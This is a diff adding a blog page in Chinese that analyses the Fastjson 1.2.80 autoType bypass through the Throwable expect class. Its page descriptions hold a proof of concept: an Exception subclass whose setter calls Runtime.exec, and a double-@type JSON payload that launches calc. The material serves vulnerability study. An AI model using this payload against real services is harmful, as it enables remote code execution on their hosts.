@@ -1,0 +1,530 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  Fastjson1.2.80漏洞分析
+  #
+
+
+  1.2.68 的修复
+  #
+
+之前在 Fastjson 1.2.68 中是通过AutoCloseable这个类来实现绕过的，所以针对这个绕过方法，Fastjson 在过滤的expectClass进行了修改，新增了三个类java.lang.Runnable、java.lang.Readable和java.lang.AutoCloseable，然后将原来的Class类型的判断修改为对 hash 的判断。
+
+  漏洞原理
+  #
+
+原理还是基于 Fastjson 反序列化恢复类实例时，需要恢复用到的类属性，而checkAutoType()中期望类机制会在实例化类属性的对应类后将其加入到类缓存mappings中。如果这个属性是可利用的类且我们可控，可以直接利用或者进一步横向扩展出其他类间接利用。依靠属性名赋值时的隐式类间关系，不再需要在 JSON 中显式指定@type，从缓存中取类在修复前不会判断autoTypeSupport，从而绕过了autoType的白名单检查。
+而 1.2.80 使用的是另一个期望类，即异常类Throwable。
+
+  漏洞复现
+  #
+
+直接导入对应版本的 Fastjson 的依赖：
+<dependencies>
+	<dependency>
+		<groupId>com.alibaba</groupId>
+		<artifactId>fastjson</artifactId>
+		<version>1.2.80</version>
+	</dependency>
+</dependencies>
+先写一个继承了Exception的类：
+package com.solowalker.fastjson.poc;
+
+import java.io.IOException;
+
+public class Poc extends Exception{
+    public void setName(String str) throws IOException {
+        Runtime.getRuntime().exec(str);
+    }
+}
+然后进行反序列化：
+package com.solowalker.fastjson.poc;
+
+import com.alibaba.fastjson.JSON;
+
+public class PocDemo {
+    public static void main(String[] args) {
+        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.solowalker.fastjson.poc.Poc\",\"name\":\"calc\"}";
+        JSON.parse(json);
+    }
+}
+![屏幕截图 2026-11-18 220651](/images/screenshots/屏幕截图 2026-11-18 220651.png)'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><meta property="og:site_name" content="Solowalker"><meta property="og:title" content="Fastjson1.2.80漏洞分析"><meta property="og:description" content='Fastjson1.2.80漏洞分析 # 1.2.68 的修复 # 之前在 Fastjson 1.2.68 中是通过AutoCloseable这个类来实现绕过的，所以针对这个绕过方法，Fastjson 在过滤的expectClass进行了修改，新增了三个类java.lang.Runnable、java.lang.Readable和java.lang.AutoCloseable，然后将原来的Class类型的判断修改为对 hash 的判断。
+漏洞原理 # 原理还是基于 Fastjson 反序列化恢复类实例时，需要恢复用到的类属性，而checkAutoType()中期望类机制会在实例化类属性的对应类后将其加入到类缓存mappings中。如果这个属性是可利用的类且我们可控，可以直接利用或者进一步横向扩展出其他类间接利用。依靠属性名赋值时的隐式类间关系，不再需要在 JSON 中显式指定@type，从缓存中取类在修复前不会判断autoTypeSupport，从而绕过了autoType的白名单检查。
+而 1.2.80 使用的是另一个期望类，即异常类Throwable。
+漏洞复现 # 直接导入对应版本的 Fastjson 的依赖：
+<dependencies> <dependency> <groupId>com.alibaba</groupId> <artifactId>fastjson</artifactId> <version>1.2.80</version> </dependency> </dependencies> 先写一个继承了Exception的类：
+package com.solowalker.fastjson.poc; import java.io.IOException; public class Poc extends Exception{ public void setName(String str) throws IOException { Runtime.getRuntime().exec(str); } } 然后进行反序列化：
+package com.solowalker.fastjson.poc; import com.alibaba.fastjson.JSON; public class PocDemo { public static void main(String[] args) { String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.solowalker.fastjson.poc.Poc\",\"name\":\"calc\"}"; JSON.parse(json); } } ![屏幕截图 2026-11-18 220651](/images/screenshots/屏幕截图 2026-11-18 220651.png)'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-11-18T00:00:00+00:00"><meta property="article:modified_time" content="2026-11-18T00:00:00+00:00"><title>Fastjson1.2.80漏洞分析 | Solowalker</title>
+<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/><link rel=stylesheet href=/book.min.bef206ca73466d23b093d88913fd40ccba55f422e1e51ed680a9e04a58cdc341.css integrity="sha256-vvIGynNGbSOwk9iJE/1AzLpV9CLh5R7WgKngSljNw0E=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.3de8dbe0bc5cb7d5f2810fa9992a295c2dcda43dba0d06c25f23613592913863.js integrity="sha256-Pejb4Lxct9XygQ+pmSopXC3NpD26DQbCXyNhNZKROGM=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><img src=/images/logo/solowalker.png alt=Logo class=top-header-logo>
+<a href=https://s0lowalker.github.io/ class=top-header-title>Solowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/images/logo/solowalker.png alt=Logo class=book-icon><span>Solowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-f3baf843ac4871d7cc6c9747f091d4ee class=toggle checked>
+<label for=section-f3baf843ac4871d7cc6c9747f091d4ee class="flex justify-between"><a role=button>Java攻防</a></label><ul><li><input type=checkbox id=section-ed10ff85653d7364765d5831a959b09b class=toggle checked>
+<label for=section-ed10ff85653d7364765d5831a959b09b class="flex justify-between"><a role=button>Fastjson反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ class=active>Fastjson1.2.80漏洞分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.62-1.2.68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>Fastjson1.2.62-1.2.68反序列化漏洞</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/>Fasjson各版本绕过</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>Fastjson1.2.24漏洞分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%9F%BA%E7%A1%80/>Fastjson基础</a></li></ul></li><li><input type=checkbox id=section-94cb9c321d608771dba7d61d7bff1f9f class=toggle>
+<label for=section-94cb9c321d608771dba7d61d7bff1f9f class="flex justify-between"><a role=button>内存马篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bservlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Servlet 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Java Agent 内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bvalve%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Valve 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Blistener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Listener 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bfilter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Filter 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/>Java 内存马之内存马介绍</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%AF%87/>Java 内存马之基础篇</a></li></ul></li><li><input type=checkbox id=section-40df731824a253d5840b20b53d52c2ba class=toggle>
+<label for=section-40df731824a253d5840b20b53d52c2ba class="flex justify-between"><a role=button>EL表达式</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>EL 表达式注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>SpEL表达式注入</a></li></ul></li><li><input type=checkbox id=section-f40d137f7e26fb2fcb23fda5a456c204 class=toggle>
+<label for=section-f40d137f7e26fb2fcb23fda5a456c204 class="flex justify-between"><a role=button>Weblogic篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ssrf/>Weblogic 弱口令&文件上传&amp;SSRF</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-jndi-%E6%B3%A8%E5%85%A5/>Weblogic JNDI 注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic T3 反序列化分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic XMLDecoder反序列化</a></li></ul></li><li><input type=checkbox id=section-f4bd766ffc2c2c4a5fca527ebb421aba class=toggle>
+<label for=section-f4bd766ffc2c2c4a5fca527ebb421aba class="flex justify-between"><a role=button>Log4j2篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/log4j2%E7%AF%87/log4shell/>Log4shell</a></li></ul></li><li><input type=checkbox id=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class=toggle>
+<label for=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class="flex justify-between"><a role=button>Shiro反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro721/>Shiro721</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/>Shiro550</a></li></ul></li><li><input type=checkbox id=section-db4f1366364f6e3bdeccbe9d6728217c class=toggle>
+<label for=section-db4f1366364f6e3bdeccbe9d6728217c class="flex justify-between"><a role=button>Java反序列化之CC链</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc11/>java反序列化之CC11</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>Java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/>Java常规漏洞</a></li></ul></li><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/>23种设计模式</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/spring%E5%BC%80%E5%8F%91/>Spring开发</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jndi/>JNDI</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li></ul></li><li><input type=checkbox id=section-044b235faa94474d25fd6dc85c615699 class=toggle>
+<label for=section-044b235faa94474d25fd6dc85c615699 class="flex justify-between"><a role=button>RASP</a></label><ul><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%913%E5%A4%84%E7%90%86%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E8%AF%B7%E6%B1%82/>RASP开发(3)——处理一次真实请求</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%912%E5%AE%9E%E7%8E%B0%E5%9F%BA%E6%9C%AC%E6%8B%A6%E6%88%AA/>RASP(2)——实现基本拦截</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%911%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%91%E9%80%9A%E7%9A%84javaagent/>RASP开发(1)——第一个跑通的 Java Agent</a></li><li><a href=/docs/rasp/rasp%E5%9F%BA%E7%A1%80/>RASP基础</a></li></ul></li><li><input type=checkbox id=section-473ae1b025d727335a742474995ef6ce class=toggle>
+<label for=section-473ae1b025d727335a742474995ef6ce class="flex justify-between"><a role=button>AI安全</a></label><ul><li><input type=checkbox id=section-9713cf08d8b6b4f6fb6546222f41975d class=toggle>
+<label for=section-9713cf08d8b6b4f6fb6546222f41975d class="flex justify-between"><a role=button>简介</a></label><ul><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/llm-%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/>LLM 应用安全</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E4%B8%8E%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8/>对抗样本与模型安全</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5/>提示词注入</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E8%B6%8A%E7%8B%B1/>越狱</a></li></ul></li></ul></li><li><input type=checkbox id=section-c4d784444933fdccb12cc39e2ab0a411 class=toggle>
+<label for=section-c4d784444933fdccb12cc39e2ab0a411 class="flex justify-between"><a role=button>渗透测试</a></label><ul><li><input type=checkbox id=section-42c6aa109fe86285746031b39529fd8c class=toggle>
+<label for=section-42c6aa109fe86285746031b39529fd8c class="flex justify-between"><a role=button>web开发篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/javaee/>JavaEE</a></li><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/js%E5%BA%94%E7%94%A8/>JS应用</a></li></ul></li><li><input type=checkbox id=section-6f168133498c5817b23bc8b547002dba class=toggle>
+<label for=section-6f168133498c5817b23bc8b547002dba class="flex justify-between"><a role=button>基础入门篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/web%E4%B8%8Eapp%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F/>Web、APP与小程序架构基础</a></li></ul></li></ul></li><li><input type=checkbox id=section-326ea580ca38728d53e273bd1a79dd29 class=toggle>
+<label for=section-326ea580ca38728d53e273bd1a79dd29 class="flex justify-between"><a role=button>Nodejs安全</a></label><ul><li><a href=/docs/nodejs%E5%AE%89%E5%85%A8/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>Node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/mssql%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>MSSQL下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/mysql%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/>MySQL 读写文件与 getshell</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Fastjson1.2.80漏洞分析</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#1268-的修复>1.2.68 的修复</a></li><li><a href=#漏洞原理>漏洞原理</a></li><li><a href=#漏洞复现>漏洞复现</a></li><li><a href=#调试分析>调试分析</a></li><li><a href=#poc>POC</a></li><li><a href=#总结>总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=fastjson1280漏洞分析>Fastjson1.2.80漏洞分析
+<a class=anchor href=#fastjson1280%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90>#</a></h1><h2 id=1268-的修复>1.2.68 的修复
+<a class=anchor href=#1268-%e7%9a%84%e4%bf%ae%e5%a4%8d>#</a></h2><p>之前在 Fastjson 1.2.68 中是通过<code>AutoCloseable</code>这个类来实现绕过的，所以针对这个绕过方法，Fastjson 在过滤的<code>expectClass</code>进行了修改，新增了三个类<code>java.lang.Runnable</code>、<code>java.lang.Readable</code>和<code>java.lang.AutoCloseable</code>，然后将原来的<code>Class</code>类型的判断修改为对 hash 的判断。</p><h2 id=漏洞原理>漏洞原理
